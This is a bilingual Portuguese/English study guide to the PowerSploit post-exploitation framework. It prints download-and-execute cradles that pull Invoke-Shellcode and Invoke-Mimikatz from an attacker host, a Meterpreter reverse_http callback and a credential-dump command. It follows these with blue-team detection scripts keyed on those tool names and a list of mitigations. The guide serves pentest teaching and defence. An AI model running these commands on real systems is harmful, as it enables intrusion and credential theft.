2. Contexto e Relevância / Context and Relevance Original

O PowerSploit é uma coleção de scripts PowerShell para pós-exploração e avaliações de segurança. Fornece módulos para reconhecimento, escalada de privilégios, persistência e exfiltração em sistemas Windows. Originalmente desenvolvido por Matt Graeber, Will Schroeder (@harmj0y) e outros, tornou-se uma das frameworks mais utilizadas em red team e pentest. O seu poder está na capacidade de executar tudo em memória, sem dropar binários no disco, contornando muitas soluções de AV tradicionais. PowerSploit is a collection of PowerShell scripts for post-exploitation and security assessments. It provides modules for reconnaissance, privilege escalation, persistence, and exfiltration on Windows systems. Originally developed by Matt Graeber, Will Schroeder (@harmj0y), and others, it became one of the most widely used frameworks in red team and pentest. Its power lies in the ability to execute everything in memory, without dropping binaries to disk, bypassing many traditional AV solutions.

Installation is done by copying the module folder to one of the PowerShell module paths (e.g., $Env:windir\System32\WindowsPowerShell\v1.0\Modules) and importing with Import-Module.

4. Invoke-Shellcode — Execução de Shellcode Original

O Invoke-Shellcode injeta shellcode no processo atual do PowerShell ou num processo específico (via -ProcessID). Pode receber o shellcode como array de bytes (-Shellcode) ou usar o parâmetro -Payload para gerar shellcode Metasploit automaticamente (ex.: windows/meterpreter/reverse_http). Invoke-Shellcode injects shellcode into the current PowerShell process or a specific process (via -ProcessID). It can receive shellcode as a byte array (-Shellcode) or use the -Payload parameter to automatically generate Metasploit shellcode (e.g., windows/meterpreter/reverse_http).

4.1 Fluxo do artigo / Article's flow

# 1. Alojar o script Invoke-Shellcode.ps1 via HTTP
kali > python -m SimpleHTTPServer 8000

# 2. No alvo, descarregar e executar em memória
PS > IEX(New-Object Net.WebClient).DownloadString("http://192.168.181.128:8000/CodeExecution/Invoke-Shellcode.ps1")

# 3. Executar com payload Metasploit
PS > Invoke-Shellcode -Payload windows/meterpreter/reverse_http -lhost 192.168.181.128 -lport 4444 -Force
O -Force evita o prompt de confirmação. O listener Metasploit deve estar ativo antes da execução. -Force skips the confirmation prompt. The Metasploit listener must be running before execution.

5. PowerUp — Escalada de Privilégios Complementar

O PowerUp é um clearinghouse de vetores comuns de escalada de privilégios que dependem de misconfigurations. O comando principal é Invoke-AllChecks, que corre todas as verificações e devolve um relatório com especificações para funções de abuso. O -HTMLReport gera um relatório em HTML. PowerUp is a clearinghouse of common privilege escalation vectors that rely on misconfigurations. The main command is Invoke-AllChecks, which runs all checks and returns a report with specifications for abuse functions. -HTMLReport generates an HTML report.

5.1 Checks principais / Main checks

PS > Import-Module .\PowerUp.ps1
PS > Invoke-AllChecks -HTMLReport

# Checks individuais
PS > Get-UnquotedService
PS > Get-ModifiableServiceFile

Os checks incluem serviços sem aspas (Get-UnquotedService), ficheiros de serviço modificáveis (Get-ModifiableServiceFile), autoruns modificáveis, AlwaysInstallElevated, DLL hijacking, e credenciais em registo. Checks include unquoted services (Get-UnquotedService), modifiable service files (Get-ModifiableServiceFile), modifiable autoruns, AlwaysInstallElevated, DLL hijacking, and credentials in registry.

7. Invoke-Mimikatz — Dump de Credenciais Complementar

O Invoke-Mimikatz carrega o Mimikatz 2.0 refletidamente em memória via PowerShell, sem escrever nada no disco. Pode ser usado para dump de credenciais ou qualquer funcionalidade do Mimikatz . Invoke-Mimikatz reflectively loads Mimikatz 2.0 in memory via PowerShell, without writing anything to disk. It can be used for credential dumping or any Mimikatz functionality . 
PS > IEX(New-Object Net.WebClient).DownloadString("http://KALI_IP/Invoke-Mimikatz.ps1")
PS > Invoke-Mimikatz -DumpCreds

8. Scripts de Impacto / Impact Scripts Impacto Complementar

Os scripts abaixo ajudam o blue team a detetar atividade compatível com PowerSploit via Script Block Logging (4104) e Module Logging (4103). The scripts below help the blue team detect PowerSploit-compatible activity via Script Block Logging (4104) and Module Logging (4103).

8.1 Script 15.1 — Deteção de Commandlets PowerSploit / PowerSploit Commandlet Detection

Objetivo: detetar strings associadas ao PowerSploit em Script Block Logging (4104). Evidência: powersploit-detect.csv. Goal: detect PowerSploit-related strings in Script Block Logging (4104). Evidence: powersploit-detect.csv. 
# Script 15.1 - PowerSploit Commandlet Detection
$out = ".\powersploit-detect.csv"
$patterns = @(
  "Invoke-Shellcode", "Invoke-Mimikatz", "Invoke-Kerberoast",
  "PowerView", "PowerUp", "Invoke-AllChecks", "Get-DomainUser",
  "Get-DomainSPNTicket", "Invoke-TokenManipulation"
)
$hits = @()
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 3000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 4104 } | ForEach-Object {
    $msg = $_.Message
    foreach ($p in $patterns) {
      if ($msg -match $p) {
        $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Pattern=$p; Snippet=$msg.Substring(0,[Math]::Min(300,$msg.Length)) }
      }
    }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] PowerSploit hits: $($hits.Count) -> $out" -ForegroundColor Red

8.2 Script 15.2 — Deteção de Invoke-Mimikatz / Invoke-Mimikatz Detection

Objetivo: detetar strings específicas do Mimikatz (sekurlsa, kerberos::golden, -dumpcr) em 4104. Evidência: mimikatz-detect.csv. Goal: detect Mimikatz-specific strings (sekurlsa, kerberos::golden, -dumpcr) in 4104. Evidence: mimikatz-detect.csv. 
# Script 15.2 - Invoke-Mimikatz Detection
$out = ".\mimikatz-detect.csv"
$patterns = @("mimikatz", "-dumpcr", "sekurlsa::pth", "kerberos::ptt", "kerberos::golden")
$hits = @()
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 3000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 4104 } | ForEach-Object {
    $msg = $_.Message
    foreach ($p in $patterns) {
      if ($msg -match $p) { $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Pattern=$p; Snippet=$msg.Substring(0,[Math]::Min(300,$msg.Length)) } }
    }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Mimikatz hits: $($hits.Count) -> $out" -ForegroundColor Red

8.3 Script 15.3 — Deteção de Download Cradle / Download Cradle Detection

Objetivo: detetar padrões de download remoto (Net.WebClient, DownloadString, IEX) usados para carregar PowerSploit. Evidência: download-cradle.csv. Goal: detect remote download patterns (Net.WebClient, DownloadString, IEX) used to load PowerSploit. Evidence: download-cradle.csv. 
# Script 15.3 - Download Cradle Detection
$out = ".\download-cradle.csv"
$patterns = @("Net.WebClient", "DownloadString", "Invoke-WebRequest", "IEX", "Invoke-Expression")
$hits = @()
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 3000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 4104 } | ForEach-Object {
    $msg = $_.Message
    foreach ($p in $patterns) {
      if ($msg -match $p -and $msg -match "http") {
        $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Pattern=$p; Snippet=$msg.Substring(0,[Math]::Min(300,$msg.Length)) }
      }
    }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Download cradle hits: $($hits.Count) -> $out" -ForegroundColor Yellow

10. Mitigações Blue Team / Mitigations Complementar

  1. Script Block Logging (4104) + Module Logging (4103) — deteta os commandlets do PowerSploit.
  2. AMSI ativo — deteta Invoke-Mimikatz e IEX em tempo real.
  3. Constrained Language Mode — bloqueia Invoke-Shellcode e chamadas .NET arbitrárias.
  4. AppLocker/WDAC — restringe execução de scripts não assinados.
  5. Monitorizar Evento 4104 com Sigma rules para PowerSploit.
  6. Centralizar logs no SIEM — o PowerSploit corre em memória, mas os logs persistem.
  7. Desativar PowerShell 2.0 — evita downgrade.
  8. Restringir SeDebugPrivilege — limita Invoke-Mimikatz.
